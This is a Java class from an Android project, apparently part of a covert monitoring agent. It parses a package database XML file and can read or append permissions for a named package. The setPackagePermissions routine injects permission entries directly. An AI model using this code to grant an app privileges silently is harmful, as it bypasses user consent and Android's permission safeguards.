package com.android.service.capabilities;

import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.FactoryConfigurationError;
import javax.xml.parsers.ParserConfigurationException;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public class XmlParser {
	private static final String TAG = "XmlParser";
	
	private FileInputStream fin;
	private Document doc;
	private Element root;
	
	public XmlParser(FileInputStream fin) throws SAXException, IOException, ParserConfigurationException, FactoryConfigurationError {
		this.fin = fin;
		this.doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(this.fin);
		this.root = doc.getDocumentElement();
	}

	public String getPackagePath(String pkgName) {
		try {
			//NodeList nodes = root.getChildNodes();
			Element e = findTaggedElement(this.root, "package", "name", pkgName);
			
			if (e != null) {
				return e.getAttribute("codePath");
			}
		} catch (FactoryConfigurationError e) {
			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
				Check.log(TAG + " (root): Exception on parseXml() [FactoryConfigurationError]"); //$NON-NLS-1$
			}
		}
		
		return "";
	}
	
	public ArrayList<String> getPackagePermissions(String pkgName) {
		ArrayList<String> permissions = null;
		
		try {
			// Cerca: <package name="com.android.service"
			Element elem = findTaggedElement(this.root, "package", "name", pkgName);
			
			if (elem == null) {
				return permissions;
			}
			
			// Cerca: <perms>
			Node perms = findNodebyName(elem, "perms");
			
			if (perms == null) {
				return permissions;
			}
			
			// Estrai: <item name="android.permission.READ_LOGS" /> etc...
			permissions = getAttributesByName(perms, "item", "name");
		} catch (FactoryConfigurationError e) {
			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
				Check.log(TAG + " (root): Exception on parseXml() [FactoryConfigurationError]"); //$NON-NLS-1$
			}
		}

		return permissions;
	}
	
	public void setPackagePermissions(String pkgName, ArrayList<String> newPerm) {
		// Cerca: <package name="com.android.service"
		Element elem = findTaggedElement(this.root, "package", "name", pkgName);
		
		if (elem == null) {
			return;
		}
		
		// Cerca: <perms>
		Node perms = findNodebyName(elem, "perms");
		
		if (perms == null) {
			return;
		}
		
		// Crea: <item name="..." />
		for (String n : newPerm) {
			Element newElem = this.doc.createElement("item");
			newElem.setAttribute("name", n);
			perms.appendChild(newElem);
		}
		
		return;
	}
	
	// <package name="com.android.service" ...> 
	// -> e = element
	// -> tag = package
	// -> attribute = name
	// -> search = name to search for
	private Element findTaggedElement(Element e, String tag, String attribute, String search) {
		Element elem = null;
		NodeList nodes = e.getElementsByTagName(tag);

		for (int i = 0; i < nodes.getLength(); i++) {
			Node c = nodes.item(i);

			if ((c instanceof Element) == false) {
				continue;
			}
			
			elem = (Element)c;
		
			String attrib = elem.getAttribute(attribute);
			
			if (attrib.equals(search) == true) {
				break;
			}
		}
		
		return elem;
	}
	
	// <package name="com.android.service" ...>
	//     <perms>
	// -> e = <package ...>
	// -> name = name to search for ("perms")
	private Node findNodebyName(Element e, String name) {
		Node c = null;
		NodeList nodes = e.getElementsByTagName(name);
		
		for (int i = 0; i < nodes.getLength(); i++) {
			c = nodes.item(i);

			if ((c instanceof Element) == false) {
				continue;
			}
			
			Element elem = (Element)c;
			
			String attrib = elem.getNodeName();
							
			if (attrib.equals(name) == true) {
				break;
			}
		}
		
		return c;
	}
	
	// <package name="com.android.service" ...>
	//     <perms>
	//         <item name="android.permission.READ_LOGS">
	// -> Node n = <perms>
	// -> nodeName = "item"
	// -> attribute = "name"
	ArrayList<String> getAttributesByName(Node n, String nodeName, String attribute) {
		NodeList nodes = n.getChildNodes();
		ArrayList<String> attributesList = new ArrayList<String>();
		
		for (int i = 0; i < nodes.getLength(); i++) {
			Node c = nodes.item(i);
			
			if ((c instanceof Element) == false) {
				continue;
			}
			
			Element elem = (Element)c;
			
			if (c.getNodeName().equals(nodeName) == false) {
				continue;
			}
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getAttributesByName): " + elem.getAttribute(attribute)); //$NON-NLS-1$
			}
			
			attributesList.add(elem.getAttribute(attribute));
		}
		
		return attributesList;
	}
}
